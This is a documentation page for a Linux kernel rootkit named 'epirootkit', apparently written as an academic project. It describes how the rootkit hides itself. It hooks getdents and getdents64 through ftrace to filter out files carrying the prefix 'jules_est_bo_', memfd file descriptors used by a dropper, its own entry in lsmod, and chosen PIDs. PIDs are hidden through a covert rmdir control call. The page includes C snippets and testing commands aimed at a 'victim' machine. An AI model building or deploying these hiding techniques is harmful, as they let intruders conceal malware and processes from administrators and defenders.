---
title: "Hiding (Cardboard Box)"
description: "How the rootkit hides files, directories, memfd fds, modules and PIDs"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-07T00:44:31+01:00"
draft: false
toc: true
weight: 6
---

## Overview

Our rootkit must be invisible to standard user-land tools. We achieve this by hooking key syscalls and filtering out any trace of:

- attacker files/directories with the prefix `jules_est_bo_`
- in-memory file descriptors (`memfd:*`)
- the kernel module itself
- hidden kernel threads / PIDs

All hooks are installed via the ftrace framework and removed cleanly at unload.

---

## 1. File & Directory Hiding

### 1.1 Purpose

Prevent any process from seeing files or directories created by the rootkit (e.g. under `/usr/share/zov_f/` or with prefix `jules_est_bo_`).

### 1.2 Implementation

1. Resolve the original syscalls:
   ```c
   orig_getdents = (void *)kallsyms_lookup_name("sys_getdents");
   orig_getdents64 = (void *)kallsyms_lookup_name("sys_getdents64");
   ```
2. Register ftrace hooks in `init_hide_hooks()`:
   ```c
   ftrace_set_filter_ip(&fops_getdents,
       (unsigned long)orig_getdents, 0, 0);
   register_ftrace_function(&fops_getdents);
   /* …and similarly for getdents64… */
   ```
3. In the hook handler (`getdents_hook` / `getdents64_hook`):
   - Call the original syscall to fill the `dirent` buffer.
   - Iterate entries: if `d_name` starts with any prefix in `hide_prefixes[]`, remove that entry via `memmove()`.
   - Return the adjusted buffer length.

### 1.3 Configuration

Module parameter:
```c
static char hide_prefixes[256] = "jules_est_bo_,memfd:";
module_param_string(hide_prefix, hide_prefixes, 256, 0444);
MODULE_PARM_DESC(hide_prefix,
  "Comma-separated prefixes to hide "
  "(default: \"jules_est_bo_,memfd:\")");
```

### 1.4 Code Location

- `rootkit/hide.c`
  - `init_hide_hooks()` / `cleanup_hide_hooks()`
  - `getdents_hook()` / `getdents64_hook()`
  - `filter_dirents()` utility

### 1.5 Testing

```bash
# Load module with custom prefixes
insmod epirootkit.ko hide_prefix="jules_est_bo_,memfd:"

# Create a hidden file
mkdir /tmp/test && touch /tmp/test/jules_est_bo_secret

# Should only list normal files, not "jules_est_bo_secret"
ls /tmp/test

# Direct access still works
cat /tmp/test/jules_est_bo_secret
```

---

## 2. memfd FD Hiding

### 2.1 Purpose

Hide the anonymous in-memory binaries (`/memfd:wpn`, `/memfd:tgt`) from `/proc/<pid>/fd`.

### 2.2 Implementation

- Reuse the same `getdents()` / `getdents64()` hooks.
- Ensure `"memfd:"` is included in `hide_prefixes[]` so any FD whose target begins with `memfd:` is filtered out.

### 2.3 Testing

```bash
# After loading dropper, check FDs of the dropper process
ls -l /proc/$(pidof cron)/fd

# Entries pointing to "/memfd:…" should not appear
```

---

## 3. Kernel Module Hiding

### 3.1 Purpose

Prevent `lsmod` or `cat /proc/modules` from revealing our "epirootkit" module.

### 3.2 Implementation

1. Hook the `iterate`/`readdir` methods on the `/proc/modules` and `/sys/modules` filesystems.
2. In the hook, filter out any `dirent` whose `d_name` matches our module name.

### 3.3 Testing

```bash
lsmod | grep epirootkit      # should produce no output
cat /proc/modules | grep epirootkit  # should produce no output
```

---

## 4. PID Hiding

### 4.1 Purpose

Hide specific kernel threads or userland processes from `/proc`.

### 4.2 Control Interface

Use the `rmdir()` syscall with the name `"daniel.k.<pid>"` to hide a PID:

```c
syscall(SYS_rmdir, "daniel.k.12345");
```

### 4.3 Implementation

1. Maintain an in-kernel list of hidden PIDs.
2. In the `/proc` `getdents()` hook, skip any directory entry whose name matches an entry in `hidden_pid_list`.

### 4.4 Testing

```c
// In attacking program:
syscall(SYS_rmdir, "daniel.k.12345");

// Then on the victim:
ls /proc        # PID 12345 should not appear
```

---

### Cleanup

On module unload, all ftrace hooks are unregistered:

```c
unregister_ftrace_function(&fops_getdents);
unregister_ftrace_function(&fops_getdents64);
/* ...other hooks... */
```

All internal lists and data structures are freed, restoring original kernel behavior.
